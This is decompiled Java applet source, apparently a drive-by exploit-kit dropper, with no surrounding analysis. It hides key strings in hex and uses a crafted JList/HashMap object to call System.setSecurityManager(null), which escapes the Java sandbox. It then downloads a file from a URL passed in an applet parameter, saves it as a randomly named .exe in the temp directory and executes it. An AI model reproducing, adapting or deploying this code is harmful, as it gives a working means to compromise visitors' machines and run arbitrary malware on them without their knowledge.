// 
// Decompiled by Procyon v0.5.30
// 

package bbox;

import java.io.InputStream;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.File;
import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.applet.Applet;

public class Runner extends Applet
{
    public static String HS(final String s) {
        String string = new String();
        for (int i = 0; i < s.length(); i += 2) {
            string += (char)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return string;
    }
    
    @Override
    public void start() {
        super.start();
        try {
            final String parameter = this.getParameter("data");
            if (parameter != null) {
                GetRemoteFile(parameter);
            }
        }
        catch (Exception ex) {}
    }
    
    public Runner() {
        final Mage mage = new Mage(System.class, HS("73657453656375726974794D616E61676572"), new Object[] { null });
        final HashSet<Mage> set = new HashSet<Mage>();
        set.add(mage);
        this.add(new JList<Object>(new Object[] { new HashMap() {
                @Override
                public Set entrySet() {
                    return set;
                }
            } }));
    }
    
    static void GetRemoteFile(final String s) throws Exception {
        final String hs = HS("6162636465666768696A6B6C6D6E6F707172737475767778797A30313233343536373839");
        String string = "";
        for (int i = 0; i < 8; ++i) {
            final double random = Math.random();
            string += hs.charAt((int)Math.round(random * 35.0));
            if (random == 0.0) {
                break;
            }
        }
        final String string2 = System.getProperty(HS("6A6176612E696F2E746D70646972")) + File.separator + string + HS("2E657865");
        final URLConnection openConnection = new URL(s).openConnection();
        final InputStream inputStream = openConnection.getInputStream();
        openConnection.getContentType();
        final FileOutputStream fileOutputStream = new FileOutputStream(string2);
        final int n = 0;
        int n2 = 0;
        final byte[] array = new byte[1024];
        int read;
        while ((read = inputStream.read(array, 0, array.length)) != -1) {
            fileOutputStream.write(array, 0, read);
            ++n2;
        }
        inputStream.close();
        fileOutputStream.close();
        if (n >= 1024 || n2 > 0) {
            Runtime.getRuntime().exec(string2);
        }
    }
}
